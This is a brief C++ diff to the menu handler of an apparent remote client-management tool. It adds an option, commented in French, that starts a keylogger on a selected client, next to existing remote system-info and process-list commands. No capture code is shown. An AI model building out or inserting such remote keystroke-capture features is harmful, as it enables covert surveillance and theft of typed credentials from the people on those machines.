@@ -92,6 +92,9 @@ void MainWindow::onSelectionButtonClicked() {
         case 0: // Afficher les informations du client
             emit getInfoSys(clientId);
             break;
+        case 1: // Démarrer le keylogger
+            emit startKeylogger(clientId);
+            break;
         case 3: // Liste complète des processus
             emit requestProcessList(clientId, false);
             break;
